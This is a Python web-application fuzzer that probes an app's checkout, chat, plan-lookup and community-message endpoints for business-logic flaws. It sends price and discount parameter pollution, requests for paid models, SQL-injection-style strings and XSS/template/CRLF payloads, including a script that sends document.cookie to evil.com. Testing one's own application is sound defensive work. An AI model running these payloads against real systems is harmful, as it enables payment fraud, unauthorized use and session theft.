import sys, os, argparse, urllib.request, json

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from vibe_core import VibeTool


class BizLogic(VibeTool):
    def __init__(self):
        super().__init__("Biz Logic", "Business Logic & Parameter Pollution Fuzzer")

    def run(self, url):
        self.banner()
        base = url.rstrip("/")
        hits = 0

        # 1. Plan parameter pollution on checkout
        self.log("Test 1 — Plan parameter pollution on checkout...")
        for body in [
            {"email": "attacker@evil.com", "plan": "studio", "price": 0},
            {"email": "attacker@evil.com", "plan": "studio", "amount": 0},
            {"email": "attacker@evil.com", "plan": "studio", "discount": 100},
            {"email": "attacker@evil.com", "plan": "studio", "coupon": "FREE100"},
            {"email": "attacker@evil.com", "plan": "studio", "override": True},
        ]:
            req = urllib.request.Request(base + "/api/stripe/create-checkout",
                data=json.dumps(body).encode(), method="POST")
            req.add_header("Content-Type", "application/json")
            try:
                r = urllib.request.urlopen(req, timeout=5)
                resp = r.read().decode()
                if "url" in resp or "cs_" in resp:
                    self.log(f"[HIT] Checkout accepted extra param: {list(body.keys())[-1]}", "fail")
                    hits += 1
                else:
                    self.log(f"[ok] Rejected extra param: {list(body.keys())[-1]}")
            except urllib.error.HTTPError as e:
                self.log(f"[{e.code}] {list(body.keys())[-1]}: {e.read().decode()[:60]}")
            except Exception as ex:
                self.log(f"[ERR] {list(body.keys())[-1]}: {str(ex)[:50]}", "warn")

        # 2. Model privilege escalation — free user requesting paid model
        self.log("Test 2 — Model privilege escalation (free → paid model)...")
        paid_models = ["anthropic/claude-opus-4-7","openai/gpt-4o","google/gemini-2.5-pro"]
        for model in paid_models:
            body = json.dumps({
                "model": model,
                "messages": [{"role": "user", "content": "hello"}],
                "persona": "default",
            }).encode()
            req = urllib.request.Request(base + "/api/chat", data=body, method="POST")
            req.add_header("Content-Type", "application/json")
            try:
                r = urllib.request.urlopen(req, timeout=8)
                resp = r.read().decode()
                if '"cost_usd"' in resp:
                    try:
                        cost = float(resp.split('"cost_usd":')[1].split("}")[0].strip())
                    except Exception:
                        cost = -1
                    self.log(f"[ESCALATION] Used paid model {model} — cost: ${cost:.6f}", "fail")
                    hits += 1
                else:
                    self.log(f"[ok] {model}: {resp[:60]}")
            except urllib.error.HTTPError as e:
                self.log(f"[{e.code}] {model}: blocked")
            except Exception as ex:
                self.log(f"[ERR] {model}: {str(ex)[:50]}", "warn")

        # 3. Negative / boundary values on stripe plan
        self.log("Test 3 — Boundary values on plan lookup (IDOR enum)...")
        for email in ["", "null", "undefined", "admin", "root@localhost", "'OR'1'='1"]:
            try:
                r = urllib.request.urlopen(
                    f"{base}/api/stripe/plan?email={urllib.parse.quote(email)}", timeout=4)
                resp = r.read().decode()
                if "plan" in resp:
                    self.log(f"[INFO LEAK] email={repr(email)} => {resp}", "warn")
            except Exception:
                pass

        # 4. Community message injection
        self.log("Test 4 — Community message injection payloads...")
        for label, payload in [
            ("XSS script",      '<script>fetch("http://evil.com?c="+document.cookie)</script>'),
            ("SVG XSS",         '<svg/onload=alert(1)>'),
            ("HTML inject",     '<img src=x onerror=alert(1)>'),
            ("Template inject", "{{7*7}} ${7*7} #{7*7}"),
            ("CRLF inject",     "hello\r\nX-Injected: hacked"),
            ("JSON break",      '{"msg":"x","role":"admin"}'),
        ]:
            body = json.dumps({"message": payload, "user": "test"}).encode()
            req = urllib.request.Request(base + "/api/community/message", data=body, method="POST")
            req.add_header("Content-Type", "application/json")
            try:
                r = urllib.request.urlopen(req, timeout=5)
                resp = r.read().decode()
                self.log(f"[{r.status}] {label}: {resp[:100]}")
                if r.status == 200 and "ok" in resp.lower():
                    self.log(f"[INJECTION ACCEPTED] {label} — payload stored/sent!", "fail")
                    hits += 1
            except urllib.error.HTTPError as e:
                self.log(f"[{e.code}] {label}: {e.read().decode()[:60]}")
            except Exception as ex:
                self.log(f"[ERR] {label}: {str(ex)[:50]}", "warn")

        self.log("================================")
        self.log(f"Business logic issues found: {hits}", "fail" if hits else "pass")


if __name__ == "__main__":
    import urllib.parse
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", required=True)
    args = parser.parse_args()
    BizLogic().run(args.url)
